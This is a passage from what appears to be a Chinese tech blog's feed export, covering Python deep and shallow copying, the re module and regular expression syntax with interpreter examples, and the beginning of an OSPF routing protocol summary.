class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d=copy.deepcopy(c)</span><br><span class="line">&gt;&gt;&gt; id(c)</span><br><span class="line">1408115280264</span><br><span class="line">&gt;&gt;&gt; id(d)</span><br><span class="line">1408115279944</span><br><span class="line">&gt;&gt;&gt; id(c[0])</span><br><span class="line">1408115186504</span><br><span class="line">&gt;&gt;&gt; id(c[1])</span><br><span class="line">1408115091144</span><br><span class="line">&gt;&gt;&gt; id(d[0])</span><br><span class="line">1408115279880</span><br></pre></td></tr></table></figure><h6 id="第二种-1"><a href="#第二种-1" class="headerlink" title="第二种"></a>第二种</h6><p>外层数据类型不可变，如果里面是可变数据类型，会新开辟地址空间存放。如果内部数据类型不可变，才会如同浅拷贝一样，是对地址的引用。</p><p>外层数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; tuple=(&apos;1&apos;,&apos;2&apos;,[&apos;3&apos;])</span><br><span class="line">&gt;&gt;&gt; te = copy.deepcopy(tuple)</span><br><span class="line">&gt;&gt;&gt; id(tuple)</span><br><span class="line">1408115001816</span><br><span class="line">&gt;&gt;&gt; id(te)</span><br><span class="line">1408115260944</span><br></pre></td></tr></table></figure><p>id是不一样的</p><p>内层数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; id(tuple[0])</span><br><span class="line">1408111993160</span><br><span class="line">&gt;&gt;&gt; id(te[0])</span><br><span class="line">1408111993160</span><br><span class="line">&gt;&gt;&gt; id(tuple[2])</span><br><span class="line">1408115280200</span><br><span class="line">&gt;&gt;&gt; id(te[2])</span><br><span class="line">1408115280520</span><br></pre></td></tr></table></figure><p>不同的类型是不一样的，不可变数据的id是一样的，可变数据的id是不一样的</p><p>1、需要将当前对象拷贝的时候，一般建议拷贝为浅拷贝，（效率高，内存占有少）</p><p>2、如果说，就是需要完全分离，请使用深拷贝</p><p>结论：</p><p>元组、字符串、数值这些不可变类型，所有深浅拷贝后，永远只有一份内存</p><p>注意特殊情况，如元组中的存在可变类型的元素</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;深浅拷贝&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://soliym.top/categories/python/"/>
    
    
      <category term="高级编程" scheme="http://soliym.top/tags/%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python之正则表达式</title>
    <link href="http://soliym.top/2021/06/19/python%E4%B9%8B%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://soliym.top/2021/06/19/python之正则表达式/</id>
    <published>2021-06-19T14:37:21.006Z</published>
    <updated>2020-05-15T12:08:59.958Z</updated>
    
    <content type="html"><![CDATA[<p>正则表达式：</p><p>正则表达式也叫做匹配模式(Pattern)，它由一组具有特定含义的字符串组成，通常用于匹配和替换文本</p><p>正则表达式（英语：Regular Expression、regex 或 regexp，缩写为 RE），也译为正规表示法、常规表示法，在计算机科学中，是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串。</p><p>正则表达式这个概念最初是由 Unix 中的工具软件（例如 sed 和 grep）普及开的。</p> <a id="more"></a><p>使用正则表达式 </p><p>能很大程度的简化开发的复杂度和开发的效率，所以在 Python 中正则表达式在字符串的查 </p><p>询匹配操作中占据很重要的地位 </p><h5 id="python中的re模块"><a href="#python中的re模块" class="headerlink" title="python中的re模块"></a>python中的re模块</h5><p>为了方便对正则表达式的使用，python提供了re模块</p><p>导入模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import re</span><br></pre></td></tr></table></figure><p>查看re模块的方法和属性</p><p>dir（re）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;A&apos;, &apos;ASCII&apos;, &apos;DEBUG&apos;, &apos;DOTALL&apos;, &apos;I&apos;, &apos;IGNORECASE&apos;, &apos;L&apos;, &apos;LOCALE&apos;, &apos;M&apos;, &apos;MULTILINE&apos;, &apos;Match&apos;, &apos;Pattern&apos;, &apos;RegexFlag&apos;, &apos;S&apos;, &apos;Scanner&apos;, &apos;T&apos;, &apos;TEMPLATE&apos;, &apos;U&apos;, &apos;UNICODE&apos;, &apos;VERBOSE&apos;, &apos;X&apos;, &apos;_MAXCACHE&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__cached__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__loader__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;__spec__&apos;, &apos;__version__&apos;, &apos;_cache&apos;, &apos;_compile&apos;, &apos;_compile_repl&apos;, &apos;_expand&apos;, &apos;_locale&apos;, &apos;_pickle&apos;, &apos;_special_chars_map&apos;, &apos;_subx&apos;, &apos;compile&apos;, &apos;copyreg&apos;, &apos;enum&apos;, &apos;error&apos;, &apos;escape&apos;, &apos;findall&apos;, &apos;finditer&apos;, &apos;fullmatch&apos;, &apos;functools&apos;, &apos;match&apos;, &apos;purge&apos;, &apos;search&apos;, &apos;split&apos;, &apos;sre_compile&apos;, &apos;sre_parse&apos;, &apos;sub&apos;, &apos;subn&apos;, &apos;template&apos;]</span><br></pre></td></tr></table></figure><h5 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h5><p>正则对到小写敏感，注意大小写</p><table><thead><tr><th><code></code>   <code>元字符</code></th><th><code></code>   <code>匹配内容</code></th></tr></thead><tbody><tr><td><code>.</code></td><td><code>匹配除换行符以外的任意字符</code></td></tr><tr><td><code>\w</code></td><td><code>匹配字母或数字或下划线 -python3中匹配各国语言符号</code></td></tr><tr><td><code>\s</code></td><td><code>匹配任意的空白符</code></td></tr><tr><td><code>\d</code></td><td><code>匹配数字</code></td></tr><tr><td><code>\n</code></td><td><code>匹配一个换行符</code></td></tr><tr><td><code>\t</code></td><td><code>匹配一个制表符</code></td></tr><tr><td><code>\b</code></td><td><code>匹配一个单词的结尾</code></td></tr><tr><td><code>^</code></td><td><code>匹配字符串的开始</code></td></tr><tr><td><code>$</code></td><td><code>匹配字符串的结尾</code></td></tr><tr><td>`a</td><td>b`</td><td><code>匹配字符a或字符b</code></td></tr><tr><td><code>[...]</code></td><td><code>匹配字符组中的字符</code></td></tr></tbody></table><h5 id="反义符"><a href="#反义符" class="headerlink" title="反义符"></a>反义符</h5><table><thead><tr><th><code>\W</code></th><th><code>匹配非字母或数字或下划线</code></th></tr></thead><tbody><tr><td><code>\D</code></td><td><code>匹配非数字</code></td></tr><tr><td><code>\S</code></td><td><code>匹配非空白符</code></td></tr><tr><td><code>[^...]</code></td><td><code>匹配除了字符组中字符的所有字符</code></td></tr></tbody></table><h5 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h5><p>python的字符串中\是具有特殊含义的，要正常表示一个\，需要两个\来表示<br>在正则中，\是具有特殊含义的，要正常表示一个\,需要两个\来表示</p><h5 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h5><table><thead><tr><th>*</th><th>重复零次或更多次</th></tr></thead><tbody><tr><td>+</td><td>重复一次或更多次</td></tr><tr><td>?</td><td>重复零次或一次</td></tr><tr><td>{n}</td><td>重复n次</td></tr><tr><td>{n,}</td><td>重复n次或更多次</td></tr><tr><td>{n,m}</td><td>重复n到m次</td></tr></tbody></table><h5 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h5><p>会形成匹配后的二次筛选</p><table><thead><tr><th><code>()</code></th><th><code>匹配括号内的表达式，也表示一个组</code></th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>正则表达式是非常灵活的，可以搭配的组合非常的多，所以通过大量练习，才能掌握搭配的规律</p><h5 id="元字符案例"><a href="#元字符案例" class="headerlink" title="元字符案例"></a>元字符案例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">除换行符以外的任意字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;.&quot;,&quot;123-4567-8910&quot;) //findall方法是对所有的字符匹配，并且存储在列表中</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;-&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;]</span><br><span class="line">#除换行外所有的都会被匹配</span><br><span class="line">匹配大小写字母，数字，下划线</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\w&quot;,&quot;123-4567-8910-ZayD-12_Wd&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;1&apos;, &apos;2&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;]</span><br><span class="line">#“-”字符没有匹配，其他三种都匹配</span><br><span class="line">匹配非大小写字母，数字，下划线</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\W&quot;,&quot;123-4567-8910-ZayD-12_Wd&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;-&apos;]</span><br><span class="line">#匹配非上述三种字符，反义符，大写</span><br><span class="line">匹配空白字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\s&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;\t&apos;, &apos;\n&apos;, &apos; &apos;]</span><br><span class="line">#空白符都会被匹配</span><br><span class="line">匹配非空白字符</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\S&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;-&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;-&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;-&apos;, &apos;1&apos;, &apos;2&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;, &apos;-&apos;, &apos;8&apos;, &apos;9&apos;, &apos;-&apos;, &apos;1&apos;]</span><br><span class="line">#可以去除空白符，注意大写</span><br><span class="line">匹配数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\d&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">#匹配所有的数字</span><br><span class="line">匹配非数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;\D&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;-&apos;, &apos;_&apos;, &apos;W&apos;, &apos;d&apos;, &apos;-&apos;, &apos;\t&apos;, &apos;\n&apos;, &apos;-&apos;, &apos; &apos;]</span><br><span class="line">#去除字符串中的数字，注意大写</span><br><span class="line">匹配字符串的开始</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^1&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;]</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^2&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[]</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;^\d&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;]</span><br><span class="line">#“^”后面紧接要匹配的字符</span><br><span class="line">匹配字符串的结束</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;$&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;&apos;]</span><br><span class="line">匹配字母或数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;1&apos;, &apos;2&apos;, &apos;W&apos;, &apos;d&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">匹配除字母或数字</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[^1-9a-zA-Z]&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;-&apos;, &apos;_&apos;, &apos;-&apos;, &apos;\t&apos;, &apos;\n&apos;, &apos;-&apos;, &apos; &apos;]</span><br></pre></td></tr></table></figure><h5 id="量词案例"><a href="#量词案例" class="headerlink" title="量词案例"></a>量词案例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]*&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;&apos;, &apos;4567&apos;, &apos;&apos;, &apos;8910&apos;, &apos;&apos;, &apos;ZayD&apos;, &apos;&apos;, &apos;12&apos;, &apos;&apos;, &apos;Wd&apos;, &apos;&apos;, &apos;8&apos;, &apos;&apos;, &apos;9&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;1&apos;, &apos;&apos;]</span><br><span class="line">#“*”量词是匹配0次或者多次，结果不匹配就是匹配是0次，所以会显示空</span><br><span class="line">&gt;&gt;&gt; re.match(&quot;[0-9a-zA-Z]*&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">&lt;re.Match object; span=(0, 3), match=&apos;123&apos;&gt;</span><br><span class="line">#match是匹配字符串开头的字母，123是数字所以可以匹配，而“-”不是所以不匹配，所以结果是“123”，如果不加“*”，匹配结果是“1”，所以进行了多次匹配</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]+&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;4567&apos;, &apos;8910&apos;, &apos;ZayD&apos;, &apos;12&apos;, &apos;Wd&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;]</span><br><span class="line">#“+”是匹配一次或多次，所以不匹配就是匹配0次，所以不会显示</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]?&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;&apos;, &apos;8&apos;, &apos;9&apos;, &apos;1&apos;, &apos;0&apos;, &apos;&apos;, &apos;Z&apos;, &apos;a&apos;, &apos;y&apos;, &apos;D&apos;, &apos;&apos;, &apos;1&apos;, &apos;2&apos;, &apos;&apos;, &apos;W&apos;, &apos;d&apos;, &apos;&apos;, &apos;8&apos;, &apos;&apos;, &apos;9&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;1&apos;, &apos;&apos;]</span><br><span class="line">#“？”是匹配0次或者一次，所以会逐位匹配</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;12&apos;, &apos;45&apos;, &apos;67&apos;, &apos;89&apos;, &apos;10&apos;, &apos;Za&apos;, &apos;yD&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#两次匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2,&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;4567&apos;, &apos;8910&apos;, &apos;ZayD&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#两次以上匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.findall(&quot;[0-9a-zA-Z]&#123;2,3&#125;&quot;,&quot;123-4567-8910-ZayD-12_Wd-8\t9\n- 1&quot;)</span><br><span class="line">[&apos;123&apos;, &apos;456&apos;, &apos;891&apos;, &apos;Zay&apos;, &apos;12&apos;, &apos;Wd&apos;]</span><br><span class="line">#2次或三次匹配为一组</span><br><span class="line">&gt;&gt;&gt; re.match(r&quot;&lt;([a-zA-Z]*)&gt;.*&lt;/\1&gt;&quot;,&quot;&lt;a&gt;www.baidu.com&lt;/a&gt;&quot;)</span><br><span class="line">&lt;re.Match object; span=(0, 20), match=&apos;&lt;a&gt;www.baidu.com&lt;/a&gt;&apos;&gt;</span><br><span class="line">#匹配html标签&lt;([a-zA-Z]*)&gt;.*&lt;/\1&gt;，后面的\1表示前面（）内的内容</span><br><span class="line">&gt;&gt;&gt; a = re.sub(r&quot;&lt;/?([a-zA-Z]*)&gt;&quot;,&apos;&apos;,&quot;&lt;a&gt;www.baidu.com&lt;/a&gt;&quot;)</span><br><span class="line">&gt;&gt;&gt; print(a)</span><br><span class="line">#匹配标签内的内容，？表示匹配0次或一次，前面标签没有，所以/没有匹配，后面的标签有/所以被匹配，如果换成“+”就不可以，因为至少匹配一次，同样，“*”是可以的，因为可以匹配0次</span><br></pre></td></tr></table></figure><h6 id="re模块的方法"><a href="#re模块的方法" class="headerlink" title="re模块的方法"></a>re模块的方法</h6><p>前面学习了正则表达式的写法，python为方便使用正则，提供了一下配合正则使用的方法</p><h6 id="1、search"><a href="#1、search" class="headerlink" title="1、search"></a>1、search</h6><p>执行正则表达式搜索并且在搜索结束后返回所匹配到的串，只返回第一次匹配到的结果 </p><p>求出帖子阅览的次数： </p><p>>&gt;&gt; import re </p><p>>&gt;&gt; res = re.search(r”\d+”,”当前浏览量是 8808 次”) </p><p>>&gt;&gt; res.group() </p><p>‘8808’ </p><h6 id="2、findall"><a href="#2、findall" class="headerlink" title="2、findall"></a>2、findall</h6><p>匹配所有的对象，返回一个列表 </p><p>>&gt;&gt; re.findall(r”\d+”,”1 当前浏览量是 8808 次，回帖人数是 200 人”) </p><p>[‘1’, ‘8808’, ‘200’] </p><h6 id="3、sub"><a href="#3、sub" class="headerlink" title="3、sub"></a>3、sub</h6><p>实现查找替换 </p><p>>&gt;&gt; re.sub(r”\d+”,”1024”,”当前浏览量是 8808 次”) </p><p>‘当前浏览量是 1024 次’ </p><h6 id="4、split"><a href="#4、split" class="headerlink" title="4、split"></a>4、split</h6><p>分割字符串，结果返回列表 </p><p>a = re.split(‘.‘,’<a href="http://www.baidu.com&#39;" target="_blank" rel="noopener">www.baidu.com&#39;</a>)</p><p>[‘www’, ‘baidu’, ‘com’]</p><h6 id="5、finditer"><a href="#5、finditer" class="headerlink" title="5、finditer"></a>5、finditer</h6><p>返回一个迭代器 iterator，这个 iterator yield match objects.返回顺序、内容和 re.findall() </p><p>相同</p><p>>&gt;&gt; inter = re.finditer(r”[a-z]”,”<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a>)</p><p>>&gt;&gt; next(inter)</p><p>&lt;re.Match object; span=(0, 1), match=’w’&gt;</p><h6 id="5、compile"><a href="#5、compile" class="headerlink" title="5、compile"></a>5、compile</h6><p>compile 用来编译正则表达式模式字符串，并生成 Regular Expression Objects。</p><p>这个方法用来修改re模块的匹配方法</p><p>compile(pattern, flags=0) </p><p>flags 有很多可选值： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.I(IGNORECASE)忽略大小写，括号内是完整的写法 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.M(MULTILINE)多行模式，改变^和$的行为 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.S(DOTALL)点可以匹配任意字符，包括换行符 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.L(LOCALE)做本地化识别的匹配，不推荐使用 </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.U(UNICODE) 使用\w \W \s \S \d \D 使用取决于 unicode 定义的字符属性。在 python3 中默 </span><br><span class="line"></span><br><span class="line">认使用该 flag </span><br><span class="line"></span><br><span class="line">➢ </span><br><span class="line"></span><br><span class="line">re.X(VERBOSE)冗长模式，该模式下 pattern 字符串可以是多行的，忽略空白字符，并可以添加 </span><br><span class="line"></span><br><span class="line">注释</span><br></pre></td></tr></table></figure><h5 id="贪婪模式和非贪婪模式"><a href="#贪婪模式和非贪婪模式" class="headerlink" title="贪婪模式和非贪婪模式"></a>贪婪模式和非贪婪模式</h5><p>在 Python 中正则默认是贪婪模式</p><hr><p> 贪婪模式：尽可能匹配多个字符<br>非贪婪模式：尽可能匹配少的字符</p><hr><p>在*、？、+、{m,n}后面加上？，可以将贪婪模式变成非贪婪模式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;\d*&quot;,&quot;123IOHH&quot;)</span><br><span class="line"></span><br><span class="line">&lt;re.Match object; span=(0, 3), match=&apos;123&apos;&gt;</span><br><span class="line"></span><br><span class="line">\&gt;&gt;&gt; re.match(&quot;\d*?&quot;,&quot;123IOHH&quot;)</span><br><span class="line"></span><br><span class="line">&lt;re.Match object; span=(0, 0), match=&apos;&apos;&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;正则表达式：&lt;/p&gt;
&lt;p&gt;正则表达式也叫做匹配模式(Pattern)，它由一组具有特定含义的字符串组成，通常用于匹配和替换文本&lt;/p&gt;
&lt;p&gt;正则表达式（英语：Regular Expression、regex 或 regexp，缩写为 RE），也译为正规表示法、常规表示法，在计算机科学中，是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串。&lt;/p&gt;
&lt;p&gt;正则表达式这个概念最初是由 Unix 中的工具软件（例如 sed 和 grep）普及开的。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://soliym.top/categories/python/"/>
    
    
      <category term="高级编程" scheme="http://soliym.top/tags/%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>OSPF路由协议总结</title>
    <link href="http://soliym.top/2021/06/19/OSPF%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
    <id>http://soliym.top/2021/06/19/OSPF路由协议总结/</id>
    <published>2021-06-19T14:37:20.994Z</published>
    <updated>2020-05-25T03:46:42.591Z</updated>
    
    <content type="html"><![CDATA[<p>OSPF（open shortest path Fist0）是IETF组织开发的一个基于链路状态的内部网关协议，具有收敛快、路由无环、可扩展等优点。</p><a id="more"></a><h4 id="一、OSPF基础概念"><a href="#一、OSPF基础概念" class="headerlink" title="一、OSPF基础概念"></a>一、OSPF基础概念</h4><h5 id="1-1-协议特点"><a href="#1-1-协议特点" class="headerlink" title="1.1 协议特点"></a>1.1 协议特点</h5><p>适用范围：IGP</p><p>类型：链路状态型动态路由协议</p><p>算法：i-SPF算法-SPF-dijkstra（对SPF算法的改进，使其更适合路由协议）  </p><p>封装：基于IP封装，协议号为89—跨层封装在IP数据包中</p><p>版本：OSPFV2—IPV4、OSPFV3—IPV6</p><p>更新方式：组播或单播—224.0.0.5/224.0.0.6</p><p>​                      触发更新/周期更新—周期更新时间是30min</p><p>区域划分：OSPF需要合理规划IP地址和区域划分</p><p>​                 —目的：减少lsa数量、减少lsa传播范围、减少对资源的消耗</p><p>​                 —原因：OSPF需要消耗大量的路由器资源</p><p>metric计算：OSPF使用cost计算metric</p><p>​                    cost=参考带宽/链路实际带宽</p><p>​                    每条路由信息的metric值=该条路径上每段链路的cost值的总和</p><h5 id="1-2-OSPF概念"><a href="#1-2-OSPF概念" class="headerlink" title="1.2 OSPF概念"></a>1.2 OSPF概念</h5><h6 id="【一】Router-id"><a href="#【一】Router-id" class="headerlink" title="【一】Router-id"></a>【一】Router-id</h6><p>类似与IP地址形式</p><p>作用：</p><p>1、标识路由器在OSPF区域内的属性</p><p>2、区分不同LSA的始发路由器</p><p>优先级：</p><p>1、手工指定</p><p>2、最大环回接口</p><p>3、最大物理IP地址</p><h6 id="【二】cost"><a href="#【二】cost" class="headerlink" title="【二】cost"></a>【二】cost</h6><p>OSPF中计算路径的参数属性</p><p>作用：表示一条路由的路径开销</p><p>计算方法：</p><p>1、接口cost值=接口参考带宽/接口实际带宽</p><p>2、路由cost值=路由经过的所有出向接口的cost值相加</p><p>cost常用来干涉选路</p><h6 id="【三】Link-State（LSA）"><a href="#【三】Link-State（LSA）" class="headerlink" title="【三】Link-State（LSA）"></a>【三】Link-State（LSA）</h6><p>LSA是指接口的状态信息，包括IP地址，子网掩码，网络类型，cost等。OSPF中传递的不是路由信息，而是LSA，各个路由器通过收集各个路由器发出的LSA，计算出网络的拓扑图，从而选择去各个目的网段的最佳路径，LSA在网络中始终是原始信息，不可改变。</p><p>常用类型：1、2、3、4、5、7类</p><h6 id="【四】OSPF区域"><a href="#【四】OSPF区域" class="headerlink" title="【四】OSPF区域"></a>【四】OSPF区域</h6><p>OSPF是基于链路状态的，因此区域的划分是以链路为基础的，即一段链路只能属于一个OSFP区域。</p><p>目的：减少lsa数量、减少lsa传播范围、减少对资源的消耗</p><p>​        